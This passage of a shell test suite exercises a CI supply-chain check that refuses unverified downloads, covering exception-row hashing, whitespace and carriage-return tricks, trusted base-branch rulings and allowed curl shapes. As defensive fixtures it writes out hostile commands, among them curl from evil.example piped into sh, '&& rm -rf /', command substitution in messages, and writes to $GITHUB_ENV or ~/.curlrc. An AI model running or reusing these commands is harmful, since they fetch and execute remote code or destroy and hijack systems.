sp="echo ok # note; curl -s http://e.example/x | sh"
mkrow "$work/rt-sp.json" bin/ruled.sh "$sp" >/dev/null
twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
edck sp0 "$work/rt-sp.json"
CASE="R1 control: the space version with its row is ruled: exit 0"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
for ch in 1f a0 0b 0c 85 0d; do
  twoc spx bin/ruled.sh $'#!/bin/sh\n' "$(printf '#!/bin/sh\necho ok')$(python3 -c "import sys; sys.stdout.write(chr(0x$ch))")$(printf '# note; curl -s http://e.example/x | sh\nx')"
  edck spx "$work/rt-sp.json"
  CASE="R1: the same line with U+00$ch where the space was flattens identically but is never ruled: exit 1"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
done
mkrow "$work/rt-cont.json" bin/ruled.sh "echo a curl -s http://e.example/x" >/dev/null
twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
edck cont1 "$work/rt-cont.json"
CASE="R1: a backslash-newline continuation (echo a\\<newline>curl ...) is never ruled, though it flattens to the ruled line: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
edck cont0 "$work/rt-cont.json"
CASE="R1 control: the one-line version with its row is ruled: exit 0"
check test "$rc" -eq 0
# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
edck ctx "$work/rt-empty.json"
CASE="context limit (documented): a harmless ruled echo moved above its heredoc opener keeps its identity, so it is no addition (exit 0); it still only echoes"
check test "$rc" -eq 0
CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution"
check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
import hashlib, json, re, shlex, subprocess, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
    "bdc2f348c4dbc92f": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
    "59026aa06d9188a1": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
    "6acbb0aa471b0e3b": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
    "77bc505e9228dc4a": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
    "22312bde0463f438": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
    "5839155d14e99a00": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
    "80510e8b8f509a47": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
    "9f54b594e70eb20f": "cat >\"$stubs/curl\" <<'EOF'",
    "1314309c3220e619": "echo \"curl $*\" >>\"$CALLS\"",
    "64612fb9a9fe82be": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
}
SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
rows = json.load(open(sys.argv[1]))["unmeasured_text"]
assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
for r in rows:
    line = LINES[r["key"]]
    segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
    assert H(line) == r["line"] and r["key"] in {H(s) for s in segs}, r
    assert not re.search(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b", line), ("a substitution or eval can run anything", r)
    if line.startswith("#"):
        continue                                                         # a comment
    if subprocess.run(["bash", "-n", "-c", line], capture_output=True, stdin=subprocess.DEVNULL).returncode:
        assert re.match(r"^(for \w+ in \(|assert |ENVPK = \[\(|same-step\) |else )", line), ("a syntax error of an unexpected kind", line)
        if not line.startswith(("same-step) ", "else ")):
            continue                                                     # Python source: bash cannot parse it, nothing runs
    lex = shlex.shlex(line, posix=True, punctuation_chars=True); lex.whitespace_split = True; lex.commenters = ""
    cmds, cur = [], []
    for tok in lex:                                                      # quote-aware: a | inside a quoted string is text, not a pipe
        if tok in (";", ";;", "|", "||", "&&", "&"):
            cmds.append(cur); cur = []
        else:
            cur.append(tok)
    cmds.append(cur)
    for c in cmds:
        while c and c[0] in ("else", "then", "do"):
            c = c[1:]
        if len(c) > 1 and c[1] == ")":
            c = c[2:]                                                    # a case pattern: word)
        if c:
            assert c[0] in SAFE, ("not a harmless command", c, r)
PY
# a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
rtrows "$work/rt" "$work/rt-head.json" all
newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
rc=0; python3 "$chk" --root "$work/rthead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: rows that only the pull request adds (its own .github/supply-chain-exceptions.json) are never read: both lines fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
mkdir -p "$work/trusted-gh/agent"; cp -R "$here/../supply-chain" "$work/trusted-gh/agent/supply-chain"
git -C "$work/rthead" show HEAD:.github/supply-chain-exceptions.json >"$work/trusted-gh/supply-chain-exceptions.json"; rc=0
python3 "$work/trusted-gh/agent/supply-chain/pin-age-check.py" --root "$work/rthead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: the default rulings file is the one beside the checkout the script runs from (CI: trusted/.github/supply-chain-exceptions.json): the same rows there pass (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2
rm -rf "$work/trusted-gh"
CASE="AC16: the default rulings path is the script's own checkout (.github/supply-chain-exceptions.json beside .github/agent), whatever --root says"
check python3 - "$chk" "$root" <<'PY'
import importlib.util, os, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
PY
CASE="AC16: the committed unmeasured_text rows load, and each has exactly file, form, key and line (16 lowercase hex each), a 'text, not a command:' ruling and no duplicate"
check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
import importlib.util, json, re, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
rows = json.load(open(sys.argv[2]))["unmeasured_text"]
loaded = ac.load_ruled_text(sys.argv[2], required=True)
assert rows and len(loaded) == len(rows), (len(rows), len(loaded))
forms = {"a download"} | {w for _, w in ac.inv._UNMEASURED}
for r in rows:
    assert set(r) == {"file", "form", "key", "line", "ruling"}, r
    assert re.fullmatch(r"[0-9a-f]{16}", r["line"]), r
    assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
    assert re.fullmatch(r"[0-9a-f]{16}", r["key"]) and r["ruling"].startswith("text, not a command: ") and len(r["ruling"]) > len("text, not a command: ") + 10, r
PY

# --- REQ-SUP-001-AC19: ruled INPUT FETCHES. A line that really downloads an input whose name or version comes from a lock or the registry (a package,
# an index, a key, a draft release asset of this repository) is listed in the BASE branch's unmeasured_input_fetch: the AC16 row {file, form, key, line,
# ruling[, count]} (same binding, same counting, same whitespace and continuation refusal, same strict JSON) plus host (the literal host every address
# on the line names, or repo:self for the authenticated draft download), verifier {file, function | line} (the step that checks the bytes), test
# {file, case} (the case proving that failing bytes are rejected before use) and, for a download that follows redirects, redirects: true. The WHOLE
# line must be one of a closed set of shapes; anything the check cannot read is refused (fail closed). -------------------------------------------------
cat >"$work/if.py" <<'PY'
import hashlib, json, pathlib, re, shutil, subprocess, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
CASEN = "a package whose bytes fail verify_sha256 is removed before use"
cmd, args = sys.argv[1], sys.argv[2:]
if cmd == "repo":     # repo SRC OUT (base|head PATH TEXT|-)...: a copy of SRC, a commit with the base files, then a head commit ("-" deletes the file)
    src, out, spec = args[0], args[1], args[2:]
    shutil.rmtree(out, ignore_errors=True); shutil.copytree(src, out, symlinks=True)
    g = lambda *a: subprocess.run(["git", "-C", out, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
    for part in ("base", "head"):
        for i in range(0, len(spec), 3):
            if spec[i] != part:
                continue
            p = pathlib.Path(out) / spec[i + 1]
            if spec[i + 2] == "-":
                p.unlink()
            else:
                p.parent.mkdir(parents=True, exist_ok=True); p.write_bytes(spec[i + 2].encode("utf-8", "surrogateescape"))
        g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", part)
elif cmd == "row":    # row FILE LINE HOST [OVERRIDES-JSON]: the row for LINE's download (null in OVERRIDES deletes a field)
    f, line, host = args[:3]
    flat = " ".join(line.split()); seg = next((s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s)), None)
    form = "a download" if seg is not None else "a gh release or extension download"   # the gh form hashes the WHOLE line (key == line)
    row = {"file": f, "form": form, "key": H(seg if seg is not None else flat), "line": H(flat), "ruling": "an input fetch: verify_sha256 checks the bytes against the lock before use",
           "host": host, "verifier": {"file": "bin/fetch.sh", "function": "verify_sha256"}, "test": {"file": "bin/fetch-test.sh", "case": CASEN}}
    for k, v in (json.loads(args[3]) if len(args) > 3 else {}).items():
        if v is None:
            row.pop(k, None)
        else:
            row[k] = v
    print(json.dumps(row))
elif cmd == "file":   # file OUT MODE ROW...: an exceptions file with the rows in unmeasured_input_fetch (MODE: plain, or how to break or split it)
    out, mode, rows = args[0], args[1], [json.loads(r) for r in args[2:]]
    d, raw = {"exceptions": [], "unmeasured_text": [], "unmeasured_input_fetch": rows}, None
    if mode == "both": d["unmeasured_text"] = [{k: rows[0][k] for k in ("file", "form", "key", "line", "ruling")}]
    elif mode == "split": d["unmeasured_text"], d["unmeasured_input_fetch"] = [{k: rows[0][k] for k in ("file", "form", "key", "line", "ruling")}], rows[1:]
    elif mode == "astext": d["unmeasured_text"], d["unmeasured_input_fetch"] = [{k: r[k] for k in ("file", "form", "key", "line", "ruling")} for r in rows], []
    elif mode == "notlist": d["unmeasured_input_fetch"] = {"rows": rows}
    elif mode == "notdict": d["unmeasured_input_fetch"] = [list(rows[0].values())]
    elif mode == "dup": d["unmeasured_input_fetch"] = rows + rows[:1]
    elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_input_fetch": [], "unmeasured_input_fetch": ' + json.dumps(rows) + '}'
    elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_input_fetch": [' + json.dumps(rows[0])[:-1] + ', "host": "evil.example"}]}'
    elif mode == "nanrow": raw = '{"exceptions": [], "unmeasured_input_fetch": [' + json.dumps(rows[0])[:-1] + ', "count": NaN}]}'
    elif mode != "plain": raise SystemExit("unknown mode " + mode)
    open(out, "w").write(raw if raw is not None else json.dumps(d, indent=2))
else:
    raise SystemExit("unknown command " + cmd)
PY
ifrepo() { local n=$1; shift; python3 "$work/if.py" repo "$base" "$work/$n" "$@"; }
ifrow() { python3 "$work/if.py" row "$@"; }
ifx() { python3 "$work/if.py" file "$@"; }
ifck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --json "$work/if.json" --exceptions "$2" >"$work/if.out" 2>&1 || rc=$?; }
HOSTN=packages.example.dev
LIT='curl -q -fsS -g --max-time 60 --proto =https -o "$tmp/APKINDEX.tar.gz" "https://packages.example.dev/os/${arch}/APKINDEX.tar.gz"'
KEY='curl -q -fsS -g --proto =https --max-filesize 65536 -o "$tmp/key.pub" https://packages.example.dev/key.rsa.pub || die "could not fetch the key" 1'
FETCH=$'#!/bin/sh\nset -eu\nverify_sha256() { echo "$2  $1" | sha256sum -c - >/dev/null || { rm -f "$1"; exit 1; }; }\n'
TESTT=$'#!/bin/sh\nCASE="a package whose bytes fail verify_sha256 is removed before use"\n'
SIGT=$'#!/bin/sh\n# the signature check a redirects row needs (advisor ruling 3b): cosign verify-blob with the certificate identity and issuer\nverify_sig() {\n  cosign verify-blob --bundle "$1.bundle" \\\n    --certificate-identity "https://github.com/o/r/.github/workflows/rel.yml@refs/heads/main" \\\n    --certificate-oidc-issuer https://token.actions.githubusercontent.com "$1" || { rm -f "$1"; exit 1; }\n}\n'
SUPPORT=(base bin/fetch.sh "$FETCH" base bin/fetch-test.sh "$TESTT" base bin/sig.sh "$SIGT")
SIGV='"verifier": {"file": "bin/sig.sh", "function": "verify_sig"}'
ifrepo ifm "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n'
RLIT=$(ifrow bin/fetch.sh "$LIT" "$HOSTN"); RKEY=$(ifrow bin/fetch.sh "$KEY" "$HOSTN")
ifx "$work/if-ok.json" plain "$RLIT" "$RKEY"
CASE="AC19 setup: the fixture adds exactly two unmeasured downloads (an index and a key, both from the literal host), the scan stays strict"
check python3 - "$chk" "$work/ifm" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
a = ac._added_unmeasured(sys.argv[2], "HEAD~1", "HEAD")
assert len(a) == 2 and all(x[0] == "bin/fetch.sh" and x[1] == "a download" for x in a), a
PY
ifck ifm "$work/if-ok.json"
CASE="AC19: a base-branch row for each added input fetch (host, verifier, test present in the head) passes: exit 0, each reported as a ruled input fetch naming its verifier"
check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 2; check grep -q 'verify_sha256' "$work/if.out"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1]))['moved']; assert len(r)==2 and all(x['ok'] and 'ruled input fetch' in x['reason'] for x in r), r" "$work/if.json"
ifx "$work/if-one.json" plain "$RLIT"; ifck ifm "$work/if-one.json"
CASE="AC19: a row exempts exactly its own fetch: the other added download fails (exit 1), the ruled one is reported as ruled"
check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 1
ifx "$work/if-none.json" plain; ifck ifm "$work/if-none.json"
CASE="AC19: an empty unmeasured_input_fetch exempts nothing: both added downloads fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 2
for ov in '{"key": "0000000000000000"}' '{"line": "0000000000000000"}' '{"file": "bin/other.sh"}'; do
  ifx "$work/if-w.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "$ov")" "$RKEY"; ifck ifm "$work/if-w.json"
  CASE="AC19: a row whose identity does not match ($ov) does not apply: that fetch fails (exit 1)"
  check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 1
done
ifrepo ifedit "${SUPPORT[@]}" head bin/fetch.sh "$FETCH${LIT/APKINDEX.tar.gz\"/APKINDEX.tar.gz2\"}"$'\n'"$KEY"$'\n'
ifck ifedit "$work/if-ok.json"
CASE="AC19: editing a ruled fetch line voids its row (the whole-line hash changes): the edited fetch fails (exit 1), the other stays ruled"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
ifrepo ifpipe "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head bin/fetch.sh "$FETCH$LIT | sh"$'\n'
ifck ifpipe "$work/if-ok.json"
CASE="AC19 (edited line is an addition): a ruled fetch rewritten to pipe into sh keeps its download segment but is an addition no row names: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
ifrepo iftwice "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LIT"$'\n'
ifx "$work/if-c1.json" plain "$RLIT"; ifck iftwice "$work/if-c1.json"
CASE="AC19 (count): the same fetch line added twice with a row that counts one fails (exit 1)"
check test "$rc" -eq 1
ifx "$work/if-c2.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" '{"count": 2}')"; ifck iftwice "$work/if-c2.json"
CASE="AC19 (count): count 2 on the fetch line added twice passes (exit 0)"
check test "$rc" -eq 0
# F9: the held recheck enforces the count too: two copies already on the base, a row that counts one, nothing added
ifrepo ifheld2 "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n'"$LIT"$'\n' head README.md 'x'
ifck ifheld2 "$work/if-c1.json"
CASE="AC19 (count, F9): a ruled fetch held in the head more times than its row counts fails though nothing is added (exit 1)"
check test "$rc" -eq 1; check grep -q 'count' "$work/if.out"
ifck ifheld2 "$work/if-c2.json"
CASE="AC19 (count, F9) control: the same with count 2 passes (exit 0)"
check test "$rc" -eq 0
ifrepo ifcont "${SUPPORT[@]}" head bin/fetch.sh "$FETCH"'curl -q -fsS -g --max-time 60 --proto =https \'$'\n''-o "$tmp/APKINDEX.tar.gz" "https://packages.example.dev/os/${arch}/APKINDEX.tar.gz"'$'\n'
ifck ifcont "$work/if-ok.json"
CASE="AC19 (continuation): the ruled line joined from a backslash-newline continuation is never ruled, though it flattens to the ruled line: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
ifrepo ifvt "${SUPPORT[@]}" head bin/fetch.sh "$FETCH${LIT/ -o/$'\v'-o}"$'\n'
ifck ifvt "$work/if-ok.json"
CASE="AC19 (odd whitespace): the ruled line with a vertical tab where a space was is never ruled: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
# F5: a file holding a carriage return (a lone CR hides text from the line split; CRLF too) or bytes that are not UTF-8 rules nothing (AC16 and AC19)
crcase() { # HEAD-TEXT WHY
  ifrepo ifcr "${SUPPORT[@]}" head bin/fetch.sh "$1"
  ifck ifcr "$work/if-ok.json"
  CASE="AC19 (F5): $2: exit 1, no fetch ruled"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
}
crcase "$FETCH$LIT"$'\n'"$KEY"$'\n# note\r curl -s https://evil.example/x | sh\n' 'a lone CR elsewhere in the file'
NL=$'\n'; CRNL=$'\r\n'
crcase "${FETCH//$NL/$CRNL}$LIT$CRNL$KEY$CRNL" 'a CRLF file'
crcase "$FETCH$LIT"$'\n'"$KEY"$'\n# \udcff\n' 'a file with bytes that are not UTF-8'
twoc crt bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n# a\rcurl -s https://evil.example/y | sh\n'
mkrow "$work/rt-crt.json" bin/ruled.sh "echo 'curl https://example.invalid/x'" >/dev/null; edck crt "$work/rt-crt.json"
CASE="AC16 (F5): a ruled TEXT line in a file holding a lone CR is not ruled: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
ifrepo nut head bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n# \xff\n'
edck nut "$work/rt-crt.json"
CASE="AC16 (F5): a ruled TEXT line in a file that is not UTF-8 is not ruled: exit 1, named"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0; check grep -q 'not UTF-8' "$work/rt.out"
# (5) base only: a row the pull request brings in its own exceptions file does nothing; the same rows in the trusted copy beside the script do
ifrepo ifhead "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n' head .github/supply-chain-exceptions.json "$(cat "$work/if-ok.json")"
rc=0; python3 "$chk" --root "$work/ifhead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/if.out" 2>&1 || rc=$?
CASE="AC19: input-fetch rows that only the pull request adds (its own .github/supply-chain-exceptions.json) are never read: both fetches fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/if.out")" -eq 2
mkdir -p "$work/trusted-if/agent"; cp -R "$here/../supply-chain" "$work/trusted-if/agent/supply-chain"; cp "$work/if-ok.json" "$work/trusted-if/supply-chain-exceptions.json"; rc=0
python3 "$work/trusted-if/agent/supply-chain/pin-age-check.py" --root "$work/ifhead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/if.out" 2>&1 || rc=$?
CASE="AC19: the default rulings file is the trusted copy beside the script: the same input-fetch rows there pass (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 2
rm -rf "$work/trusted-if"
# (6) one list per item
ifx "$work/if-both.json" both "$RLIT" "$RKEY"; ifck ifm "$work/if-both.json"
CASE="AC19 (one list per item): the same (file, form, key, line) in unmeasured_text AND unmeasured_input_fetch stops the check: exit 2, names both lists, not a pass"
check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"; check grep -q 'unmeasured_text' "$work/if.out"; check grep -qi 'not a pass' "$work/if.out"
LITB="$LIT || exit 1"
ifrepo ifmix "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$LITB"$'\n'
ifx "$work/if-split.json" split "$(ifrow bin/fetch.sh "$LITB" "$HOSTN")" "$RLIT"; ifck ifmix "$work/if-split.json"
CASE="AC19 (one list per item): one download whose two lines are ruled one by unmeasured_text and one by unmeasured_input_fetch is not ruled: exit 1"
check test "$rc" -eq 1; check test "$(grep -cE 'ruled text|ruled input fetch' "$work/if.out")" -eq 0; check grep -q 'FAIL unmeasured:bin/fetch.sh: a download added' "$work/if.out"
ifx "$work/if-mix2.json" plain "$(ifrow bin/fetch.sh "$LITB" "$HOSTN")" "$RLIT"; ifck ifmix "$work/if-mix2.json"
CASE="AC19 (one list per item) control: both lines ruled by unmeasured_input_fetch pass (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
ifx "$work/if-astext.json" astext "$RLIT" "$RKEY"; ifck ifm "$work/if-astext.json"
CASE="AC19 (one list per item): rows in unmeasured_text only are reported as ruled text (AC16), never as ruled input fetches"
check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
# --- the WHOLE line (F1), the curl words (F2, F3, F11): one case each
hostcase() { # LINE EXPECTED-RC WHY [OVERRIDES-JSON]
  local ov=${4-}; [ -n "$ov" ] || ov='{}'
  ifrepo ifh "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$1"$'\n'
  ifx "$work/if-h.json" plain "$(ifrow bin/fetch.sh "$1" "$HOSTN" "$ov")"; ifck ifh "$work/if-h.json"
  CASE="AC19 (host row): $3: exit $2"
  check test "$rc" -eq "$2"
  if [ "$2" -eq 0 ]; then check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; else check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0; check grep -q 'input fetch not verified' "$work/if.out"; fi
}
C='curl -q -fsS -g --proto =https'; O='-o "$tmp/i"'; U='"https://packages.example.dev/os/i"'
hostcase "$LIT" 0 'control: the literal https://packages.example.dev/ with a quoted ${arch} in the path and a quoted "$tmp/..." output passes'
hostcase "$C $O $U || exit 1" 0 'control (shape): CMD || exit N passes'
hostcase "$C $O $U"' || die "could not fetch the index" 1' 0 'control (shape): CMD || die "MSG" N passes'
hostcase "if $C $O $U; then ok=1; break; fi" 0 'control (shape): if CMD; then ok=1; break; fi passes'
hostcase "echo go; $C $O $U" 1 'F1: a command before the download on the line is refused'
hostcase "curl --disable -fsS -g --proto =https $O $U" 0 'control (F2): --disable as the first argument passes'
hostcase "$C $O $U | sh" 1 'F1: piping the download into sh is refused'
hostcase "$C -o a.sh $U && sh a.sh" 1 'F1: CMD && sh a.sh is refused'
hostcase "$C -o a.sh $U; bash a.sh" 1 'F1: CMD; bash a.sh is refused'
hostcase "$C $O $U && rm -rf /" 1 'F1: CMD && rm -rf / is refused'
hostcase "$C $O $U || exit 1; sh x" 1 'F1: a second command after a wrapper shape is refused'
hostcase "$C $O $U"' || die "$(cat /tmp/x)" 1' 1 'F1: a die message with a substitution is refused'
hostcase "$C $O $U || true" 1 'F1: CMD || true (not a closed shape) is refused'
hostcase "if $C $O $U; then sh x; fi" 1 'F1: if CMD; then <anything but ok=1; break>; fi is refused'
hostcase "if ! $C $O $U; then exit 1; fi" 1 'F1: if ! CMD (not a closed shape) is refused'
hostcase "if $C $O $U | sh; then ok=1; break; fi" 1 'F1: a pipe inside the if condition is refused'
hostcase "if $C $O $U; then ok=1; sh; fi" 1 'F1: an if tail of seven tokens other than then ok=1; break; fi is refused'
hostcase "$C $O $U"' || die "fetch of $url failed" 1' 1 'F1: a die message holding a variable is refused'
hostcase "$C $O $U"' || die "mirror at https://evil.example/" 1' 1 'every :// on the WHOLE line (a die message too) must be https://<host>/'
hostcase "$C -k $O $U" 1 'F3: an option the check does not read and that takes no value (-k) is refused'
hostcase "$C --insecure $O $U" 1 'F3: --insecure is refused'
hostcase "$C $O \"https://packages.example.dev/\$HOME/x\"" 1 'F3: a denied name ($HOME) in the address path is refused'
hostcase "wget -q -g --proto =https -o \"\$tmp/i\" $U" 1 'F2: a wget line that would otherwise read as a curl command is refused (wget is not read)'
hostcase "$C $O $U &" 1 'F1: a background & is refused'
hostcase "( $C $O $U )" 1 'F1: a subshell is refused'
hostcase "curl -fsS -g $O $U" 1 'F2: curl without -q first (it would read ~/.curlrc) is refused'
hostcase "curl -fsS -q -g $O $U" 1 'F2: -q not the first argument is refused'
hostcase "curl -qfsS -g $O $U" 1 'F2: -q inside a cluster is refused'
hostcase "wget -q -O \"\$tmp/i\" https://packages.example.dev/os/i" 1 'F2: wget (no ambient-config guarantee the check reads) is refused'
hostcase "curl -q -fsS $O $U" 1 'F3: curl without -g (globoff) is refused'
hostcase "$C -o \"\$@\" $U" 1 'F3: an output "$@" is refused'
hostcase "$C -o \"\$*\" $U" 1 'F3: an output "$*" is refused'
hostcase "$C -o \$tmp/i $U" 1 'F3: an unquoted variable output is refused'
hostcase "$C -o /etc/i $U" 1 'F3: an absolute output path is refused'
hostcase "$C -o ../i $U" 1 'F3: an output path with .. is refused'
hostcase "$C -o \"\$tmp/../i\" $U" 1 'F3: an output "$NAME/../x" is refused'
hostcase "$C -o \"\$tmp/i*\" $U" 1 'F3: a glob in the output path is refused'
hostcase "$C -o \"\$HOME/.curlrc\" $U" 1 'F3: an output under $HOME (a denied name) is refused'
hostcase "$C -o \"\$GITHUB_ENV\" $U" 1 'F3: an output to $GITHUB_ENV (a denied name) is refused'
hostcase "$C -o \"\$LD_X/i\" $U" 1 'F3: an output under an LD_* name (denied) is refused'
hostcase "$C -o \"\$PYTHONSTARTUP\" $U" 1 'F3: an output to a PYTHON* name (denied) is refused'
hostcase "$C -o \"\${tmp:-/x}/i\" $U" 1 'F3: a parameter expansion other than "$NAME" in the output is refused'
hostcase "$C $O \"https://packages.example.dev/os/\$@\"" 1 'F3: "$@" in the address is refused'
hostcase "$C $O \"https://packages.example.dev/os/\$1\"" 1 'F3: a positional parameter in the address is refused'
hostcase "$C $O https://packages.example.dev/os/{a,b}" 1 'F3: URL globbing braces in the address are refused'
hostcase "$C $O \"https://packages.example.dev/os/[1-3]\"" 1 'F3: URL globbing brackets in the address are refused'
hostcase "$C $O https://packages.example.dev/os/\$x" 1 'F3: an unquoted variable in the address is refused'
hostcase "$C $O $U >\"\$tmp/log\"" 1 'F3: an output redirect is refused'
hostcase "$C $O $U 2>/dev/null" 1 'F3: a stderr redirect is refused'
hostcase "$C $O $U <\"\$cfg\"" 1 'F3: an input redirect is refused'
hostcase "$C $O 'https://packages.example.dev/os/i'" 1 'F3: a single-quoted word (not read by this check) is refused'
hostcase "curl -q -fsSL -g --proto =https $O $U" 1 'F11: -L without redirects: true on the row is refused'
R='--proto-redir =https --max-redirs 3'
hostcase "curl -q -fsSL -g --proto =https --max-redirs 3 $O $U" 1 'F11: -L with redirects: true and --max-redirs 3 but no --proto-redir =https is refused' "{\"redirects\": true, $SIGV}"
hostcase "curl -q -fsSL -g --proto =https $R $O $U" 0 'control (ruling 3): -L, --proto-redir =https, --max-redirs 3, redirects: true and a cosign verify-blob verifier pass' "{\"redirects\": true, $SIGV}"
